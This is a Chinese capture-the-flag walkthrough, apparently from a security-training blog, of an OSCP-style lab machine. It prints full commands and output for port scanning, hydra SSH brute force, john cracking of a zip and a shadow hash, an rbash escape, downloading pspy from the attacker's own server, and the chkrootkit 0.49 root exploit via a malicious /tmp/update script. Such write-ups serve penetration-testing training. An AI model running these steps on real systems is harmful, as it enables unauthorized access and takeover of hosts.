# 原创
：  文件上传漏洞靶场-OSCP系列靶场过程

# 文件上传漏洞靶场-OSCP系列靶场过程

> 
公众号：掌控安全EDU 分享更多技术文章，欢迎关注一起探讨学习


**目录**

[准备工作](#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C)

[信息收集-端口扫描](#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F)

[目标开放端口收集Nmap](#%E7%9B%AE%E6%A0%87%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3%E6%94%B6%E9%9B%86Nmap)

[开放端口扫描2次(多次扫描减少误扫)](#%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F2%E6%AC%A1%28%E5%A4%9A%E6%AC%A1%E6%89%AB%E6%8F%8F%E5%87%8F%E5%B0%91%E8%AF%AF%E6%89%AB%29)

[信息收集-端口测试](#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%AB%AF%E5%8F%A3%E6%B5%8B%E8%AF%95)

[漏洞利用-getwebshell](#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-getwebshell)

[内网遨游-getshell](#%E5%86%85%E7%BD%91%E9%81%A8%E6%B8%B8-getshell)

[信息收集-内网基础信息收集](#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)

[总结](#%E6%80%BB%E7%BB%93)

---


`getwebshell` : 发现`zip`文件 → `zip`存在密码 → `john`爆破`zip`密码 → 发现`passwd`与`shadow`文件 → 爆破`shadow`密码 → `ssh`登录

`提 权 思 路` : 发现后台运行程序 → 上传`pspy64`查看 → 发现`chkrootkit` → `chkrootkit`提权

### 准备工作

启动靶机<br/> 获取目标机器IP → `192.168.190.85`<img alt="" height="38" src="https://img-blog.csdnimg.cn/851ebec238a14b8ab048f898e93a42bd.png" width="1080"/>

### 信息收集-端口扫描

---


### 目标开放端口收集Nmap

> 
-  `sudo nmap --min-rate 10000 -p- 192.168.190.85` -   -  `PORT STATE SERVICE` -  `22/tcp open ssh` -  `80/tcp open http` 


<img alt="" height="185" src="https://img-blog.csdnimg.cn/ff30bc5080ac4cd7956a7cf76f186b98.png" width="1080"/> 开放的端口-&gt;22,80

#### 目标端口对应服务探测

> 
-  `# tcp探测` -  `sudo nmap -sT -sV -O -sC -p22,80 192.168.190.85` -   -  `PORT STATE SERVICE VERSION` -  `22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 ` -  `80/tcp open http Apache httpd 2.4.38` 


### 信息收集-端口测试

---


#### 22-SSH端口的信息收集

##### 22-SSH端口版本信息与MSF利用

通过`Nmap`探测获得SSH的版本信息，可以尝试利用<br/> 探测版本为`OpenSSH 7.9p1 Debian 10+deb10u2`

> 
-  `# 搜索对应脚本` -  `msf6 &gt; searchsploit openssh 7.9p1` 


##### 22-SSH协议支持的登录方式

通过`Nmap`探测获得SSH的版本信息，在获取到某个用户名之后尝试

> 
`1.sudo ssh root@192.168.190.85 -v`


显示`publickey`、`password`就是支持密钥以及密码登录<img alt="" height="310" src="https://img-blog.csdnimg.cn/2a91bde4a3fe4ff097a2daf889a231c1.png" width="1080"/>

##### 22-SSH手动登录尝试(无)

因为支持密码登录，尝试`root`账户的密码弱密码尝试

> 
`1.sudo ssh root@192.168.190.85 -p 22`
`2.# 密码尝试`
`3.password &gt; root`


弱密码尝试失败<img alt="" height="111" src="https://img-blog.csdnimg.cn/28daf0701e71465c9e72aae98b8cab2c.png" width="1080"/>

##### 22-SSH弱口令爆破(静静等待)

因为支持密码登录，尝试`root`账户的密码爆破，利用工具`hydra`，线程-t为6

> 
`1.sudo hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 -vV 192.168.190.85 ssh -s 22`


挂着工具进行爆破，我们尝试后续信息收集<img alt="" height="316" src="https://img-blog.csdnimg.cn/d2478525b6014ebf8a12475e207da47d.png" width="1080"/>

#### 80-HTTP端口的信息收集

访问 `http://192.168.190.85:80` 不是`CMS`，访问发现了一个`zip`<img alt="" height="229" src="https://img-blog.csdnimg.cn/e086c6d216d04891bb32ba92a2e9c737.png" width="1080"/>

利用`wget`下载

> 
`1.wget http://192.168.190.85/save.zip`


<img alt="" height="186" src="https://img-blog.csdnimg.cn/3d4782f469dc43a19c54eff7b6888a4f.png" width="1080"/> 尝试打开发现需要密码

> 
`1.┌──(root㉿Kali)-[/home/bachang/SunsetDecoy]`
`2.└─# unzip save.zip `
`3.Archive: save.zip`
`4.[save.zip] etc/passwd password:`


##### 暴力破解-hash密码破解

> 
`1.# 利用zip2john将zip转换`
`2.zip2john save.zip → password.hash`
`3.# 利用john离线破译hash的zip密码`
`4.john --wordlist=/usr/share/wordlists/rockyou.txt password.hash`


得到了密码`manuel`<img alt="" height="165" src="https://img-blog.csdnimg.cn/f80efda9f86848b7b8760dbad24050a1.png" width="1080"/>

进行解压

> 
-  `┌──(root㉿Kali)-[/home/bachang/SunsetDecoy]` -  `└─# unzip save.zip ` -  `Archive: save.zip` -  `[save.zip] etc/passwd password: ` -  `inflating: etc/passwd ` -  `inflating: etc/shadow ` -  `inflating: etc/group ` -  `inflating: etc/sudoers ` -  `inflating: etc/hosts ` -  `extracting: etc/hostname` 


从名字上来看是里面的账号密码信息<img alt="" height="178" src="https://img-blog.csdnimg.cn/4609846a557241ba841027656d412594.png" width="1080"/>

### 漏洞利用-getwebshell

#### passwd用户名收集

> 
-  `┌──(root㉿Kali)-[/home/bachang/SunsetDecoy] └─# cat etc/passwd ` -  `root:x:0:0:root:/root:/bin/bash ` -  `...` -  `systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin` -  `296640a3b825115a47b68fc44501c828:x:1000:1000:,,,:/home/296640a3b825115a47b68fc44501c828:/bin/rbash` 


通过`etc/passwd`我们可以收集到用户名

#### shadow加密密码收集

> 
-  `┌──(root㉿Kali)-[/home/bachang/SunsetDecoy] └─# cat etc/shadow ` -  `....` -  `colord:*:18440:0:99999:7:::` -  `hplip:*:18440:0:99999:7:::` -  `systemd-coredump:!!:18440::::::` -  `296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.:18450:0:99999:7:::` 


在`shadow`中我们会得到加密的密码

#### john暴力破解

> 
`1.# 利用echo变成hash方便暴力破解`
`2.echo'296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.:18450:0:99999:7:::'&gt; passwd.txt`
`3.# 利用john离线破译txt密码`
`4.john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt` 


<img alt="" height="183" src="https://img-blog.csdnimg.cn/588d84aaaf4343d793fde1e831080dbf.png" width="1080"/> <img alt="" height="225" src="https://img-blog.csdnimg.cn/9ba469579b884017ab0867b9445fd0c5.png" width="1080"/>

得到了密码 `server`

#### 22-SSH账号密码登录

获取账号密码之后利用SSH进行登录

> 
-  `sudo ssh 296640a3b825115a47b68fc44501c828@192.168.190.85 -p22` -  `password → server` 


### 内网遨游-getshell

---


连接之后发现是`rbash`<img alt="" height="105" src="https://img-blog.csdnimg.cn/5ec623aec1734a74b445cef7757a51b9.png" width="1080"/>

#### SSH连接受限逃逸

##### SSH连接受限伪终端逃逸

SSH连接到远程服务器上发现各种命令受限利用-t逃逸

> 
-  `# -t 增加伪终端 bash -- 表示传入bash的shell 不加载用户配置` -  `sudo ssh 296640a3b825115a47b68fc44501c828@192.168.190.85 -p22 -t "bash --noprofile"` -  `password → server` -  `# ssh登录之后获取环境变量` -  `echo $PATH` -  `# 重写环境变量` -  `PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin` 


连接进来之后没有找到命令说明要配置环境变量<img alt="" height="70" src="https://img-blog.csdnimg.cn/d76a647945aa47658909a1df72f90d82.png" width="1080"/>

目前的环境变量可以发现在本地，零时修改一下

#### FLAG1获取

> 
-  `296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ find / -name local.txt 2&gt;/dev/null` -  `/home/296640a3b825115a47b68fc44501c828/local.txt` -  `296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cat local.txt` -  `f750ece6f4ea704c2902f5f7f6c10d2d` 


## 信息收集-内网基础信息收集

提权的本质在于`枚举`，在获取shell之后我们要进行内网信息的收集，都是为了`提权`做准备

##### 检测Linux操作系统的发行版本

较老的`Ubuntu`以及Linux系统可以`overlayfs`提权

> 
-  `# 确定发行版本` -  `296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ lsb_release -a` -  `No LSB modules are available.` -  `Distributor ID: Debian` -  `Description: Debian GNU/Linux 10 (buster)` -  `Release: 10` -  `Codename: buster` 


发行版本为`Debian`，不太能`overlayfs`提权

##### 检测Linux操作系统的内核版本

较低的内核版本可以进行`脏牛`提权

> 
-  `296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ uname -a` -  `Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux` 


内核版本为`4.19.0`

##### 检测当前用户的权限

> 
-  `296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ id` -  `uid=1000(296640a3b825115a47b68fc44501c828) gid=1000(296640a3b825115a47b68fc44501c828) groups=1000(296640a3b825115a47b68fc44501c828)` 


##### 列举出所有的sudo文件

查找具有`sudo`权限，且不需要密码的可提权文件<br/> 如果发现`sudo -l`有东西的话 访问 `https://gtfobins.github.io` 寻找

> 
-  `# 利用sudo -l寻找` -  `296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ sudo -l` -   -  `sudo: unable to resolve host 60832e9f188106ec5bcc4eb7709ce592: Name or service not known` -   -  `We trust you have received the usual lecture from the local System` -  `Administrator. It usually boils down to these three things:` -   -  `#1) Respect the privacy of others.` -  `#2) Think before you type.` -  `#3) With great power comes great responsibility.` -   -  `[sudo] password for 296640a3b825115a47b68fc44501c828: ` -  `Sorry, try again.` -  `[sudo] password for 296640a3b825115a47b68fc44501c828: ` -  `Sorry, user 296640a3b825115a47b68fc44501c828 may not run sudo on 60832e9f188106ec5bcc4eb7709ce592.` 


发现不行

##### 列举出所有suid文件

如果发现`u=s`有东西的话 访问 `https://gtfobins.github.io` 寻找

> 
-  `# -perm 文件权限` -  `296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ find / -perm -u=s -type f 2&gt;/dev/null` -  `/usr/bin/newgrp` -  `/usr/bin/su` -  `/usr/bin/umount` -  `/usr/bin/pkexec` -  `/usr/bin/chsh` -  `/usr/bin/sudo` -  `/usr/bin/passwd` -  `/usr/bin/gpasswd` -  `/usr/bin/mount` -  `/usr/bin/chfn` -  `/usr/bin/fusermount` -  `/usr/lib/policykit-1/polkit-agent-helper-1` -  `/usr/lib/eject/dmcrypt-get-device` -  `/usr/lib/openssh/ssh-keysign` -  `/usr/lib/dbus-1.0/dbus-daemon-launch-helper` 


##### getcap标志进程收集

高版本下`suid`列举不全，查看`getcap`

> 
-  `# 探查有CAP_SETUID标志的进程` -  `296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /usr/sbin/getcap -r / 2&gt;/dev/null` -  `/usr/bin/ping = cap_net_raw+ep` 


##### 列举定时任务

查找所有的定时任务，并且查看定时任务是否具有修改权限

> 
-  `# 寻找定时任务并修改进行提权` -  `cat /etc/crontab` 


##### 寻找root权限进程

> 
-  `# 调整行列，方便查询进程` -  `stty rows 50 cols 250` -  `# 查找进程，是否存在root权限进程` -  `ps aux | grep root` 


##### 查看历史信息(无)

可能用户留下的历史信息具有有用的信息

> 
`1.history`


##### 确认/home目录下信息

`/home`目录下的用户可以做账号字典尝试`弱密码`以及`爆破`

> 
-  `296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ls -al /home` -   -  `drwxr-xr-x 2 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4096 Aug 27 2020 296640a3b825115a47b68fc44501c828` 


###### 确认当前用户home目录下是否有隐藏文件

> 
-  `# 例如.ssh找密码 ./*_history找历史记录等` -  `296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ls -al` -  `total 56` -  `drwxr-xr-x 2 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4096 Aug 27 2020 .` -  `drwxr-xr-x 3 root root 4096 Jun 27 2020 ..` -  `lrwxrwxrwx 1 root root 9 Jul 7 2020 .bash_history -&gt; /dev/null` -  `-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 220 Jun 27 2020 .bash_logout` -  `-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 3583 Jun 27 2020 .bashrc` -  `-rwxr-xr-x 1 root root 17480 Jul 7 2020 honeypot.decoy` -  `-rw------- 1 root root 1855 Jul 7 2020 honeypot.decoy.cpp` -  `lrwxrwxrwx 1 root root 7 Jun 27 2020 id -&gt; /bin/id` -  `lrwxrwxrwx 1 root root 13 Jun 27 2020 ifconfig -&gt; /bin/ifconfig` -  `-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 33 Jul 30 10:37 local.txt` -  `lrwxrwxrwx 1 root root 7 Jun 27 2020 ls -&gt; /bin/ls` -  `lrwxrwxrwx 1 root root 10 Jun 27 2020 mkdir -&gt; /bin/mkdir` -  `-rwxr-xr-x 1 root root 807 Jun 27 2020 .profile` -  `-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 66 Jun 27 2020 .selected_editor` -  `-rwxrwxrwx 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 32 Aug 27 2020 user.txt` 


看到了一个可疑的文件，具有执行和读取功能<img alt="" height="281" src="https://img-blog.csdnimg.cn/1c5ce8f0c2f6453c90cf7503452e4189.png" width="1080"/>

在无法读取的情况下尝试运行

> 
-  `296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy` -  `--------------------------------------------------` -   -  `Welcome to the Honey Pot administration manager (HPAM). Please select an option.` -  `1 Date.` -  `2 Calendar.` -  `3 Shutdown.` -  `4 Reboot.` -  `5 Launch an AV Scan.` -  `6 Check /etc/passwd.` -  `7 Leave a note.` -  `8 Check all services status.` 


发现有几个功能<img alt="" height="263" src="https://img-blog.csdnimg.cn/b727453c25fb4bc6ab18bcf4f128afc5.png" width="1080"/>

发现5具有交互，会进行执行，但是我看不到<img alt="" height="88" src="https://img-blog.csdnimg.cn/52d042dae89542518e10a4b3286e2c2c.png" width="1080"/>

系统会通知我们扫描将在 60 秒内启动。这暗示有一个正在运行的进程，我们可能想要仔细研究

#### Pspy查看进程

> 
`1.Pspy是一个命令行工具，用于在不需要root权限的情况下窥探进程。它允许您在其他用户运行的命令、cron任务等执行时查看它们。该工具通关循环遍历/proc下的值来获取进程参数信息。`


> 
`1.wget https://github.com/DominicBreuker/pspy.git`


> 
`1.# 利用python开启http服务，方便目标机器上下载文件`
`2.sudo python3 -m http.server 80`


> 
`1.# 下载`
`2.wget http://192.168.45.194:80/pspy64`
`3.# 给权限`
`4.chmod +x pspy64`
`5.# 运行`
`6../pspy64`


上传`pspy64`之后运行脚本

<img alt="" height="305" src="https://img-blog.csdnimg.cn/7d00fe64f8084b188fe687ae1e4692ca.png" width="1080"/>查看是否有进程进行  <img alt="" height="411" src="https://img-blog.csdnimg.cn/2a2e38b4e97d4ff0b83c06baefeeb2e7.png" width="1080"/>

发现执行了`/bin/sh /root/chkrootkit-0.49/chkrootkit`<img alt="" height="296" src="https://img-blog.csdnimg.cn/2a2714854a0e4ed083e3a5ea2f100f52.png" width="1080"/>

#### 权限提升

#### chkrootkit提权

发现程序中会进行`chkrootkit`

> 
`1.searchsploit chkrootkit`


可以发现正好有`0.49`的<img alt="" height="410" src="https://img-blog.csdnimg.cn/337811a17fa14b27a26a6c234bcea783.png" width="1080"/>

> 
<pre>`1.cat /usr/share/exploitdb/exploits/linux/local/33899.txt`</pre>


仔细查看说在`/tmp`下放置一个`update`的文件会以`root`权限运行<br/> 那么构造一个恶意的`update`可以让我权限提升<img alt="" height="332" src="https://img-blog.csdnimg.cn/4fb95ca847d54719b90be7cc6ecf300b.png" width="1080"/>

> 
-  `# 移动` -  `cd /tmp` -  `# 写提权` -  `echo '#!/bin/sh` -  `chmod +s /usr/bin/find' &gt; update` -  `# 加执行` -  `chmod +x update` -  `# 查看find权限` -  `which find` -  `ls -al /usr/bin/find` -  `# find-suid提权` -  `find . -exec /bin/bash -p \; -quit` 


> 
-  `296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ls -al /usr/bin/find` -  `-rwsr-sr-x 1 root root 315904 Feb 16 2019 /usr/bin/find` -  `296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ` -  `296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ find . -exec /bin/bash -p \; -quit` -  `bash-5.0# id` -  `uid=1000(296640a3b825115a47b68fc44501c828) gid=1000(296640a3b825115a47b68fc44501c828) euid=0(root) egid=0(root) groups=0(root),1000(296640a3b825115a47b68fc44501c828)` -  `bash-5.0#` 


 提权成功<img alt="" height="145" src="https://img-blog.csdnimg.cn/04e4f2e1e58745bb80243ed954dc9323.png" width="1080"/>

#### FLAG2获取

> 
-  `bash-5.0# cat /root/proof.txt` -  `462b67a92407c2b0d746f9298fbfa2f6` 


完结撒花~<img alt="" height="58" src="https://img-blog.csdnimg.cn/e11332ef98944816a6b6d4ffd92765f1.png" width="1080"/>

### 总结

---


当没有思路的时候，可以上传`pspy64`来尝试发现`root`下运行的进程

**没看够~？欢迎关注！**

** **<img alt="" height="567" src="https://img-blog.csdnimg.cn/d89b5fd1e8b24bb0a88152b3995f9ebd.jpeg" width="1015"/>

 渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/f333a24647774be5b99b00fb7019d620.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/3e579b7d7a164889a57771c035775069.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/a601ca2e0eb040bd911477a4f54fef8e.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/04beeeb6757b422a83ca0900a349a544.png" width="665"/>
